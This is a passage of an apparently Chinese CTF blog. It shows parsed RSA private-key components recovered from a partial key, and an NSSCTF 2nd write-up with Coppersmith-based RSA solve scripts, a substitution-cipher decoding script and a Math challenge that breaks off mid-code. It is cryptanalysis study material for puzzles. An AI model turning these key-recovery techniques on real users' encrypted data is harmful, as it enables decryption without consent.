class="hljs-number">010001</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 81 80：</strong> 私钥指数d，0x80表示长度128字节</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">d <span class="hljs-operator">=</span> <span class="hljs-number">0554</span><span class="hljs-keyword">c</span><span class="hljs-number">882</span>a<span class="hljs-number">75</span>d<span class="hljs-number">8</span>b<span class="hljs-number">3</span>b<span class="hljs-number">4</span>be<span class="hljs-number">18</span>a<span class="hljs-number">7</span>b<span class="hljs-number">9</span>acd<span class="hljs-number">367</span>b<span class="hljs-number">9632</span>d<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>cb<span class="hljs-number">89239</span>cd<span class="hljs-number">3</span>fb<span class="hljs-number">367</span>b<span class="hljs-number">924</span>cfa<span class="hljs-number">98</span>f<span class="hljs-number">8760</span>d<span class="hljs-number">8</span>ffb<span class="hljs-number">0665</span>ce<span class="hljs-number">3</span>b<span class="hljs-number">458</span>eaa<span class="hljs-number">841</span><span class="hljs-keyword">c</span><span class="hljs-number">010</span>b<span class="hljs-number">62e6</span>da<span class="hljs-number">9</span>bc<span class="hljs-number">2</span>dc<span class="hljs-number">76e314</span>f<span class="hljs-number">3</span>ebe<span class="hljs-number">694</span>f<span class="hljs-number">8</span>ae<span class="hljs-number">7e82</span>bd<span class="hljs-number">7e8</span>e<span class="hljs-number">3</span>b<span class="hljs-number">7</span>cbb<span class="hljs-number">17</span>d<span class="hljs-number">4</span>f<span class="hljs-number">14263</span>d<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">328</span>bd<span class="hljs-number">5</span>d<span class="hljs-number">16566004098953</span>b<span class="hljs-number">851</span>dbb<span class="hljs-number">87</span>f<span class="hljs-number">802</span>a<span class="hljs-number">38</span>af<span class="hljs-number">73</span>ccb<span class="hljs-number">9</span>bfec<span class="hljs-number">9</span>eaee<span class="hljs-number">7</span>fac<span class="hljs-number">92</span>b<span class="hljs-number">6</span>daad<span class="hljs-number">96</span>d<span class="hljs-number">7</span>d<span class="hljs-number">49e90</span>d<span class="hljs-number">68e5460</span>a<span class="hljs-number">148</span>aeb<span class="hljs-number">22334e6</span><span class="hljs-keyword">c</span><span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 41：</strong> 素数p，0x41表示长度65字节</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">p <span class="hljs-operator">=</span> <span class="hljs-number">00</span>f<span class="hljs-number">40</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">874</span><span class="hljs-keyword">c</span><span class="hljs-number">39</span>b<span class="hljs-number">3</span>d<span class="hljs-number">452e5</span>be<span class="hljs-number">257835</span>d<span class="hljs-number">24</span>cff<span class="hljs-number">6</span>b<span class="hljs-number">2627</span>de<span class="hljs-number">2</span>af<span class="hljs-number">1666</span>a<span class="hljs-number">799e073</span>e<span class="hljs-number">6</span>fd<span class="hljs-number">5997</span>d<span class="hljs-number">238</span>f<span class="hljs-number">7</span>a<span class="hljs-number">1641</span>b<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ac<span class="hljs-number">21</span>bd<span class="hljs-number">5e0</span>bbcbd<span class="hljs-number">0</span>d<span class="hljs-number">932165</span>f<span class="hljs-number">050</span>fec<span class="hljs-number">3</span>da<span class="hljs-number">3</span>bcd<span class="hljs-number">2</span>dbea<span class="hljs-number">24</span><span class="hljs-keyword">c</span><span class="hljs-number">505</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 41：</strong> 素数q，同上</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">q <span class="hljs-operator">=</span> <span class="hljs-number">00</span>f<span class="hljs-number">30963</span>dc<span class="hljs-number">1</span>df<span class="hljs-number">32</span>b<span class="hljs-number">6</span>d<span class="hljs-number">292</span>be<span class="hljs-number">1e3</span>faf<span class="hljs-number">1620256909</span>aa<span class="hljs-number">20</span>b<span class="hljs-number">4</span>d<span class="hljs-number">27</span>efffd<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">9</span>bcb<span class="hljs-number">5</span>b<span class="hljs-number">55</span>f<span class="hljs-number">5</span>edf<span class="hljs-number">9</span>b<span class="hljs-number">1</span>eb<span class="hljs-number">99974</span>d<span class="hljs-number">8</span>ebb<span class="hljs-number">865500</span>dbed<span class="hljs-number">5</span>da<span class="hljs-number">95</span>bd<span class="hljs-number">1</span>de<span class="hljs-number">1</span>b<span class="hljs-number">93e00</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>def<span class="hljs-number">29778e8957</span><span class="hljs-keyword">c</span><span class="hljs-number">2e5</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 40：</strong> $d \mod p-1$，长度0x40即64字节</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">dp</span> <span class="hljs-operator">=</span> <span class="hljs-number">62290</span>a17369fd6b8f6328752aad0738e72f74f18be7986e303b735f549a9070e1a3abc1f1e131dad9b7ba7a68716020ca6cfb69fd1716e1bfcd7de18063d73e1<br></code></pre></td></tr></table></figure><ul><li><strong>02 40：</strong> $d \mod q-1$，长度同上</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">dq <span class="hljs-operator">=</span> <span class="hljs-number">3</span>ce<span class="hljs-number">3565</span><span class="hljs-keyword">c</span><span class="hljs-number">58388</span>ae<span class="hljs-number">1</span>af<span class="hljs-number">55</span>ea<span class="hljs-number">22</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">0</span>bc<span class="hljs-number">4</span>b<span class="hljs-number">39</span>b<span class="hljs-number">133</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>dfc<span class="hljs-number">1960497</span><span class="hljs-keyword">c</span><span class="hljs-number">6545</span>d<span class="hljs-number">4e9</span>ced<span class="hljs-number">81081</span>d<span class="hljs-number">317</span>ea<span class="hljs-number">194</span>a<span class="hljs-number">7</span>d<span class="hljs-number">090</span>cd<span class="hljs-number">454</span><span class="hljs-keyword">c</span><span class="hljs-number">2392018</span>a<span class="hljs-number">03</span>ae<span class="hljs-number">3</span>f<span class="hljs-number">0</span>efb<span class="hljs-number">9</span>a<span class="hljs-number">2847e847128</span>ba<span class="hljs-number">52</span>d<br></code></pre></td></tr></table></figure><ul><li><strong>02 41：</strong> $q^{-1}\mod p$，长度同上</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">q_inv_p <span class="hljs-operator">=</span> <span class="hljs-number">00</span>eb<span class="hljs-number">5</span>a<span class="hljs-number">32</span>f<span class="hljs-number">31620e1</span>bb<span class="hljs-number">980467829</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>a<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">3</span>b<span class="hljs-number">2</span>f<span class="hljs-number">8</span>d<span class="hljs-number">7</span>f<span class="hljs-number">4</span>f<span class="hljs-number">42131</span>ed<span class="hljs-number">7</span>a<span class="hljs-number">289825</span>f<span class="hljs-number">0</span>aeaf<span class="hljs-number">390</span>b<span class="hljs-number">542</span><span class="hljs-keyword">c</span><span class="hljs-number">755</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>dcc<span class="hljs-number">94</span>dfaee<span class="hljs-number">609</span>fba<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">50731</span>b<span class="hljs-number">6</span>a<span class="hljs-number">1</span>d<span class="hljs-number">197</span>b<span class="hljs-number">7</span>b<span class="hljs-number">9</span>a<span class="hljs-number">91267</span>acdade<span class="hljs-number">62</span>f<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><blockquote><p>ps：注意在处理不完整的base64时，要通过删除一些数据来保证正确解码</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd 复现</title>
    <link href="/2025/07/01/NSSCTF%202nd/"/>
    <url>/2025/07/01/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h2 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length()&lt;<span class="hljs-number">200</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>kbits = <span class="hljs-number">103</span><br>m = (m &gt;&gt; kbits) &lt;&lt; kbits<br>Mod = getPrime(<span class="hljs-number">1024</span>)<br>hint1 = (<span class="hljs-number">2021</span>-<span class="hljs-number">2023</span>*m) % Mod<br>hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2023</span>, Mod)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint1 =&#x27;</span>,hint1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint2 =&#x27;</span>,hint2)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span><br><span class="hljs-string">c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span><br><span class="hljs-string">hint1 = 153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span><br><span class="hljs-string">hint2 = 130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>$hint2-2^{2023}&#x3D;kM$<br>$hint1\equiv 2021-2023m \mod kM$<br>打coppersmith，得到小根m，之后便是已知明文高位，接着打coppersmith<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span><br>c = <span class="hljs-number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span><br>hint1 = <span class="hljs-number">153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span><br>hint2 = <span class="hljs-number">130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span><br><br>kM = hint2 - <span class="hljs-number">2</span>^<span class="hljs-number">2023</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(kM))<br>f = hint1 - <span class="hljs-number">2021</span> + <span class="hljs-number">2023</span> * x<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">200</span>,beta=<span class="hljs-number">0.44</span>)<br>m = <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(m)</span><br><br>PR.&lt;y&gt; = PolynomialRing(Zmod(n))<br>f = (m+y)^<span class="hljs-number">3</span> - c<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">103</span>,beta=<span class="hljs-number">0.44</span>)<br>M = roots[<span class="hljs-number">0</span>]+ m<br>ans = long_to_bytes(<span class="hljs-built_in">int</span>(M))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h2><p><strong>题目：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">✧✡✭<br>✡✮ ✣✴✯ ✤✶✬✬✱ ✬✤ ✱✦✢✥✮✯✧✧, ✴✬✷✯ ✡✧ ✣✴✯ ✶✡✰✴✣. ✡✣ ❂✢✡✮✰✧ ✩✬✸✤✬✢✣, ✤✦✡✣✴, ✦✮✱ ✩✬✮✤✡✱✯✮✩✯. ✡✣ ✰✡✲✯✧ ✳✧ ✰✳✡✱✦✮✩✯ ★✴✯✮ ★✯ ✦✢✯ ✶✬✧✣, ✦✮✱ ✰✡✲✯✧ ✧✳✷✷✬✢✣ ★✴✯✮ ★✯ ✦✢✯ ✦✤✢✦✡✱. ✦✮✱ ✣✴✯ ✸✬✸✯✮✣ ★✯ ✰✡✲✯ ✳✷ ✴✬✷✯, ★✯ ✰✡✲✯ ✳✷ ✬✳✢ ✶✡✲✯✧. ✣✴✯ ★✬✢✶✱ ★✯ ✶✡✲✯ ✡✮ ✡✧ ✱✡✧✡✮✣✯✰✢✦✣✡✮✰ ✡✮✣✬ ✦ ✷✶✦✩✯ ✬✤ ✸✦✶✡✩✯ ✦✮✱ ✴✦✣✢✯✱, ★✴✯✢✯ ★✯ ✮✯✯✱ ✴✬✷✯ ✦✮✱ ✤✡✮✱ ✡✣ ✴✦✢✱✯✢. ✡✮ ✣✴✡✧ ★✬✢✶✱ ✬✤ ✤✯✦✢, ✴✬✷✯ ✣✬ ✤✡✮✱ ❂✯✣✣✯✢, ❂✳✣ ✯✦✧✡✯✢ ✧✦✡✱ ✣✴✦✮ ✱✬✮✯, ✣✴✯ ✸✬✢✯ ✸✯✦✮✡✮✰✤✳✶ ✶✡✤✯ ✬✤ ✤✦✡✣✴ ★✡✶✶ ✸✦✥✯ ✶✡✤✯ ✸✯✦✮✡✮✰✤✳✶.<br>✧✬✸✯✣✡✸✯✧ ★✯ ✣✴✡✮✥ ✬✤ ✱✢✯✦✸✧ ✦✧ ✤✦✮✣✦✧✡✯✧ - ✡✣&#x27;✧ ✯✦✧✵ ✣✬ ✱✬ ★✴✯✮ ✵✬✳ ✴✦✲✯ ✸✬✮✯✵, ✢✯✮✣, ✦✮✱ ★✬✢✥. ❂✳✣ ✵✬✳ ✩✦✮&#x27;✣ ✷✢✯✷✦✢✯ ✵✬✳✢✧✯✶✤ ✦✮✱ ✫✳✸✷ ✬✤✤ ✣✴✯ ✩✶✡✤✤: ✵✬✳ ✧✴✬✳✶✱ ✰✢✬★ ✵✬✳✢ ★✡✮✰✧ ✤✡✢✧✣. ✦ ✶✡✣✣✶✯ ❂✡✣ ✣✬★✦✢✱ ✣✴✯ ✱✢✯✦✸. ✧✣✯✷ ❂✵ ✧✣✯✷. ✣✦✥✯ ✦ ✧✣✯✷ ✤✬✢★✦✢✱. ✦✤✣✯✢ ✦✶✶, ✡✣&#x27;✧ ✵✬✳✢ ✸✡✧✧✡✬✮.<br>✥✯✯✷ ✤✦✡✣✴ ✦✮✱ ✴✬✷✯ ✤✬✢ ✣✴✯ ✤✳✣✳✢✯. ✸✦✥✯ ✵✬✳✢ ✸✬✧✣ ✧✡✮✩✯✢✯ ✱✢✯✦✸✧, ✦✮✱ ★✴✯✮ ✣✴✯ ✬✷✷✬✢✣✳✮✡✣✡✯✧ ✩✬✸✯, ✣✴✯✵ ★✡✶✶ ✤✡✰✴✣ ✤✬✢ ✣✴✯✸. ✡✣ ✸✦✵ ✣✦✥✯ ✦ ✧✯✦✧✬✮ ✬✢ ✸✬✢✯, ❂✳✣ ✣✴✯ ✯✮✱✡✮✰ ★✡✶✶ ✮✬✣ ✩✴✦✮✰✯. ✦✸❂✡✣✡✬✮, ❂✯✧✣, ❂✯✩✬✸✯ ✦ ✢✯✦✶✡✣✵. ✦✮ ✳✮✩✯✢✣✦✡✮ ✤✳✣✳✢✯, ✬✮✶✵ ✬✮✯ ✧✣✯✷ ✦✣ ✦ ✣✡✸✯, ✣✴✯ ✴✬✷✯ ✩✦✮ ✢✯✦✶✡✪✯ ✣✴✯ ✱✢✯✦✸ ✬✤ ✣✴✯ ✴✡✰✴✯✧✣. ★✯ ✸✳✧✣ ✣✢✯✦✧✳✢✯ ✣✴✯ ✱✢✯✦✸, ✣✬ ✷✢✬✣✯✩✣ ✡✣ ✦ ✧✯✦✧✬✮, ✶✯✣ ✡✣ ✡✮ ✣✴✯ ✴✯✦✢✣ ❋✳✡✯✣✶✵ ✰✯✢✸✡✮✦✶.<br>✬✮✶✵ ★✴✯✮ ✵✬✳ ✳✮✱✯✢✧✣✦✮✱ ✣✴✯ ✣✢✳✯ ✸✯✦✮✡✮✰ ✬✤ ✶✡✤✯ ✩✦✮ ✵✬✳ ✶✡✲✯ ✣✢✳✶✵. ❂✡✣✣✯✢✧★✯✯✣ ✦✧ ✶✡✤✯ ✡✧, ✡✣&#x27;✧ ✧✣✡✶✶ ★✬✮✱✯✢✤✳✶, ✦✮✱ ✡✣&#x27;✧ ✤✦✧✩✡✮✦✣✡✮✰ ✯✲✯✮ ✡✮ ✣✢✦✰✯✱✵. ✡✤ ✵✬✳&#x27;✢✯ ✫✳✧✣ ✦✶✡✲✯, ✣✢✵ ✴✦✢✱✯✢ ✦✮✱ ✣✢✵ ✣✬ ✶✡✲✯ ★✬✮✱✯✢✤✳✶✶✵.<br>✡ ❂✯✶✡✯✲✯ ✣✴✯✢✯ ✡✧ ✦ ✷✯✢✧✬✮ ★✴✬ ❂✢✡✮✰✧ ✧✳✮✧✴✡✮✯ ✡✮✣✬ ✵✬✳✢ ✶✡✤✯. ✣✴✦✣ ✷✯✢✧✬✮ ✸✦✵ ✴✦✲✯ ✯✮✬✳✰✴ ✣✬ ✧✷✢✯✦✱ ✦✢✬✳✮✱. ❂✳✣ ✡✤ ✵✬✳ ✢✯✦✶✶✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✤✬✢ ✧✬✸✯✬✮✯ ✣✬ ❂✢✡✮✰ ✵✬✳ ✣✴✯ ✧✳✮ ✦✮✱ ✰✡✲✯ ✵✬✳ ✦ ✰✬✬✱ ✤✯✯✶✡✮✰, ✣✴✯✮ ✵✬✳ ✸✦✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✦ ✶✬✮✰ ✣✡✸✯.<br>✡✮ ✦ ★✬✢✱,✡ ✴✬✷✯ ✵✬✳ ★✡✶✶ ✶✡✥✯ ✩✢✵✷✣✬✰✢✦✷✴✵.✣✴✡✧ ✡✧ ✵✬✳✢ ✤✶✦✰:✮✧✧✩✣✤&#123;✩✢✵✷✣✬_✡✧_✧✬_✡✮✣✯✢✯✧✣✡✮✰_★✴✵_✱✬✮&#x27;✣_✵✬✳_✫✬✡✮_✳✧&#125;<br><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>根据文末的格式，可以看出是简单替换密码，首先将密文中的每一个图形都转换成一个唯一对应的字母，之后再在quipquip中运行即可得到明文。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ciphertext.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>strings = file.read()<br><span class="hljs-built_in">print</span>(strings)<br><br><span class="hljs-comment"># 过滤掉常见的英文、数字、空格、标点和换行</span><br>normal_ascii = <span class="hljs-built_in">set</span>(string.ascii_letters + string.digits + <span class="hljs-string">&quot; ,.&#x27;-:;[]&#123;&#125;()_\&quot;/\\\n&quot;</span>)<br><br>special_chars = []<br>seen = <span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> strings:<br>    <span class="hljs-keyword">if</span> ch <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> normal_ascii <span class="hljs-keyword">and</span> ch <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:<br>        special_chars.append(ch)<br>        seen.add(ch)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_letter_labels</span>(<span class="hljs-params">n</span>):<br>    labels = []<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(labels) &lt; n:<br>        s = <span class="hljs-string">&#x27;&#x27;</span><br>        t = i<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            s = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + (t % <span class="hljs-number">26</span>)) + s<br>            t = t // <span class="hljs-number">26</span> - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>        labels.append(s)<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> labels<br><br>labels = gen_letter_labels(<span class="hljs-built_in">len</span>(special_chars))<br>replace_map = &#123;ch: labels[i] <span class="hljs-keyword">for</span> i, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(special_chars)&#125;<br><br><span class="hljs-comment"># 替换函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_icons</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">for</span> ch, repl <span class="hljs-keyword">in</span> replace_map.items():<br>        s = s.replace(ch, repl)<br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># 输出映射表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;特殊字符映射：&quot;</span>)<br><span class="hljs-keyword">for</span> ch, l <span class="hljs-keyword">in</span> replace_map.items():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;&#x27;<span class="hljs-subst">&#123;ch&#125;</span>&#x27;: &#x27;<span class="hljs-subst">&#123;l&#125;</span>&#x27;&quot;</span>)<br><br><span class="hljs-comment"># 替换结果</span><br>c_replaced = replace_icons(strings)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n替换后的文本:\n&quot;</span>)<br><span class="hljs-built_in">print</span>(c_replaced)<br></code></pre></td></tr></table></figure><p><img src="/2025/07/01/NSSCTF%202nd/file-20250630112051419.png"></p><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>length = <span class="hljs-built_in">len</span>(flag)<br>flag1 = flag[:length//<span class="hljs-number">2</span>]<br>flag2 = flag[length//<span class="hljs-number">2</span>:]<br>e = <span class="hljs-number">65537</span><br><br>m1 = bytes_to_long(flag1)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br><br>p1 = gmpy2.invert(p,q)<br>q1 = gmpy2.invert(q,p)<br>c = <span class="hljs-built_in">pow</span>(m1,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p1=&quot;</span>,p1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q1=&quot;</span>,q1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;phi=&quot;</span>,phi)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p1= 3020925936342826638134751865559091272992166887636010673949262570355319420768006254977586056820075450411872960532347149926398408063119965574618417289548987</span><br><span class="hljs-string">q1= 4671408431692232396906683283409818749720996872112784059065890300436550189441120696235427299344866325968178729053396743472242000658751114391777274910146291</span><br><span class="hljs-string">c= 25112054943247897935419483097872905208058812866572413543619256987820739973912338143408907736140292730221716259826494247791605665059462509978370784276523708331832947651238752021415405546380682507724076832547566130498713598421615793975775973104012856974241202142929158494480919115138145558312814378701754511483</span><br><span class="hljs-string">phi= 57503658815924732796927268512359220093654065782651166474086873213897562591669139461637657743218269483127368502067086834142943722633173824328770582751298229218384634668803018140064093913557812104300156596305487698041934061627496715082394633864043543838906900101637618600513874001567624343801197495058260716932</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>m2 = bytes_to_long(flag2)<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m2, e, n)<br>hint = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2023</span> * p + <span 